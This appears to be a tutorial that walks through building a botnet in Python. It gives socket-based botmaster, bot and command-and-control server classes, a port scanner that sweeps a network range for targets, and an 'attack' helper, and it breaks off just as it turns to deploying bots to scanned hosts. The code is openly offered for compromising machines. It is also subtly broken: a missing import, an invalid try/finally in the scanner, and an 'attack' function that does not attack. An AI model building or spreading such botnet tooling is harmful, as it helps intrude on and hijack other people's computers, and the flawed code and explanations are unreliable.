## What is a Botnet?

A botnet is a collection of compromised computers, each of the computers in a botnet are called bots or zombies. The botnet is controlled by a botmaster, who uses the bots to perform malicious tasks. Botnets are used for a variety of purposes, including DDoS attacks, spamming, and cryptocurrency mining.

Some general terms used in this article:

- **Botmaster**: The person who controls the botnet.
- **Bot**: A computer that is part of the botnet.
- **Command and Control Server**: A server that the botmaster uses to control the bots.

In this article/tutorial, we'll build a botnet from scratch using Python. We'll start by creating a botmaster that can control the bots, then the creation of a bot that can join the botnet and receive commands from the botmaster. Finally, we'll create a command and control server that the botmaster can use to control the bots.


## Prerequisites

- Python 3.6+


## Botnet Infrastructure

A botnet consists most commonly of a botmaster, command and control servers, and bots. The botmaster controls the botnet and can send commands to the bots. The bots are computers that are part of the botnet and can receive commands from the botmaster. The command and control servers are servers that the botmaster uses to control the bots.

A basic botnet infrastructure looks like this:

```text
            +-----------------+
            |    Botmaster    |
            +-----------------+
                     |
            +-----------------+
            |   C&C Server    |
            +-----------------+
                     |
         ___________/ \__________
        /                        \
+-----------------+     +-----------------+
|      Bot 1      |     |      Bot 2      |
+-----------------+     +-----------------+
```

The differences between the components of a botnet are:

- The botmaster controls the botnet and can send commands to the bots.
- The bots are computers that are part of the botnet and can receive commands from the botmaster.
- The command and control servers are servers that the botmaster uses to control the bots.
- The botmaster can control the bots using a command and control server.
- The botmaster can send commands to the bots using a command and control server.


## Creating the Botmaster

The botmaster's minimal functions include the ability to send commands to the bots and receive information from them, however the botmaster can also update the malware on the bots.

To start this off, we'll create a file called `botmaster.py` and create a class called `Botmaster` with the following functions:

```python
import socket
import json
import base64

class Botmaster:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            print(f"[*] Connected to {self.host}:{self.port}")
        except Exception as e:
            print(f"[*] Connection to {self.host}:{self.port} failed: {e}")
            sys.exit(1)

    def send_command(self, command):
        try:
            self.sock.send(command.encode())
            print(f"[*] Command sent: {command}")
        except Exception as e:
            print(f"[*] Command failed: {e}")
            sys.exit(1)

    def receive_data(self):
        try:
            data = self.sock.recv(1024).decode()
            print(f"[*] Data received: {data}")
        except Exception as e:
            print(f"[*] Data failed: {e}")
            sys.exit(1)

    def close(self):
        self.sock.close()
        print("[*] Connection closed")
```

Now let's breakdown all of what we've written above.

When we create a new instance of the `Botmaster` class, we pass in two arguments, `host` and `port`, which are used to connect to the command and control server.

The method `connect` is used to connect to the command and control server. It uses the `socket` module to create a socket and connect to the command and control server.

The method `send_command` is used to send commands to the bots. It takes one argument, `command`, which is the command to send to the bots. It uses the `socket` module to send the command to the command and control server.

The method `receive_data` is used to receive data from the bots. It uses the `socket` module to receive data from the command and control server.

The method `close` is used to close the connection to the command and control server. It uses the `socket` module to close the connection.

Before we explain the implementation of the `Botmaster` class, let's create continue with the creation of the bot.

## Creating the Bot

The bot's minimal functions include the ability to receive commands from the botmaster and send information to them, however the bot can also update the malware on the bots.

To start this off, we'll create a file called `bot.py` and create a class called `Bot` with the following functions:

```python
import socket
import json
import base64

class Bot:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            print(f"[*] Connected to {self.host}:{self.port}")
        except Exception as e:
            print(f"[*] Connection to {self.host}:{self.port} failed: {e}")
            sys.exit(1)

    def receive_command(self):
        try:
            command = self.sock.recv(1024).decode()
            print(f"[*] Command received: {command}")
        except Exception as e:
            print(f"[*] Command failed: {e}")
            sys.exit(1)

    def send_data(self, data):
        try:
            self.sock.send(data.encode())
            print(f"[*] Data sent: {data}")
        except Exception as e:
            print(f"[*] Data failed: {e}")
            sys.exit(1)

    def close(self):
        self.sock.close()
        print("[*] Connection closed")
```

Now let's breakdown all of what we've written above.

When we create a new instance of the `Bot` class, we pass in two arguments, `host` and `port`, which are used to connect to the command and control server.

You may notice that the `Bot` class is very similar to the `Botmaster` class. This is because the bot and the botmaster have similar functions, but the botmaster has more functions than the bot.

The methods `connect`, `receive_command`, `send_data`, and `close` are the same as the methods in the `Botmaster` class.

The method `receive_command` is used to receive commands from the botmaster. It uses the `socket` module to receive commands from the command and control server.

Now that we've created the bot, let's create the command and control server.

## Creating the Command and Control Server

The command and control server's minimal functions include the ability to receive commands from the botmaster and send information to them, however the command and control server can also update the malware on the bots.

To start this off, we'll create a file called `cnc_server.py` and create a class called `CnCServer` with the following functions:

```python
import socket
import json
import base64

class CnCServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def start(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
            print(f"[*] Listening on {self.host}:{self.port}")
        except Exception as e:
            print(f"[*] Listening on {self.host}:{self.port} failed: {e}")
            sys.exit(1)

    def accept(self):
        try:
            self.client, self.addr = self.sock.accept()
            print(f"[*] Accepted connection from {self.addr[0]}:{self.addr[1]}")
        except Exception as e:
            print(f"[*] Accepting connection from {self.addr[0]}:{self.addr[1]} failed: {e}")
            sys.exit(1)

    def receive_command(self):
        try:
            command = self.client.recv(1024).decode()
            print(f"[*] Command received: {command}")
        except Exception as e:
            print(f"[*] Command failed: {e}")
            sys.exit(1)

    def send_data(self, data):
        try:
            self.client.send(data.encode())
            print(f"[*] Data sent: {data}")
        except Exception as e:
            print(f"[*] Data failed: {e}")
            sys.exit(1)

    def close(self):
        self.sock.close()
        print("[*] Connection closed")
```

Now let's breakdown all of what we've written above.

When we create a new instance of the `CnCServer` class, we pass in two arguments, `host` and `port`, which are used to start the command and control server.

The only difference between the `CnCServer` class and the `Botmaster` class is that the `CnCServer` class has a method called `start` that is used to start the command and control server.

The method `start` is used to start the command and control server. It uses the `socket` module to create a socket and bind it to the host and port. It also uses the `socket` module to listen for connections.

The method `accept` is used to accept connections from the botmaster. It uses the `socket` module to accept connections from the botmaster.

However, now that we have the core mechanisms of our botnet, we can start connecting the pieces.


## Connecting the Botmaster, Bot, and Command and Control Server

Great! Let's take a look at how we can connect the botmaster, bot, and command and control server.

First, we'll create a file called `botnet.py` and import the `Botmaster`, `Bot`, and `CnCServer` classes from the files we created earlier:

```python
from botmaster import Botmaster
from bot import Bot
from cnc_server import CnCServer
```

So our problem is we have our mechanisms for the botnet, but we don't have any target to attack. So let's find a target to attack.

For us to be able to do this, we can take a cidr range and quietly scan it for hosts that exist, then we can use those hosts as targets to be able to scan for vulnerabilities.

So let's create a file called `utils.py` and import the `ipaddress` and `socket` modules:

```python
import ipaddress
import socket

def scan(cidr, ports=[]):
    hosts = []
    for ip_addr in ipaddress.IPv4Network(cidr):
      host = [ip_addr, []]
      for port in ports:
        try:
            socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((str(ip_addr), port))
            host[-1].append(port)
        except Exception as e:
            pass
      finally:
        if len(host[-1]) > 0:
          hosts.append(host)
          
    return hosts
```

Now let's breakdown all of what we've written above.

When we call the `scan` function, we pass in one argument, `cidr`, which is the cidr range to scan.

For this example we can use our own local network, so we can use the following code:

```python
from utils import scan

hosts = scan("192.168.1.1/24", [22, 80, 8080])

with open("hosts.txt", "w") as f:
    for host in hosts:
      for port in host[-1]:
        f.write(f"{host}:{port}\n")

```

The `scan` function uses the `ipaddress` module to iterate through the cidr range and the `socket` module to check if the host is up. If the host is up, it adds it to the file `hosts.txt` with the ip address and the hosts open port.

Now that we have our potential targets, we can start determining which ones are vulnerable.

So let's add to our `utils.py` file with a method called `attack`:

```python
from bot import Bot

def attack(host, port):
    bot = Bot(host, port)
    bot.connect()
    bot.receive_command()
    bot.send_data("Hello World!")
    bot.close()
```

Now that we have our hosts, we can start gaining access to them and deploying our botnet.


So we're going to create a file called `deploy.py` and which will take the hosts from the `hosts.txt` file and deploy our botnet to them.
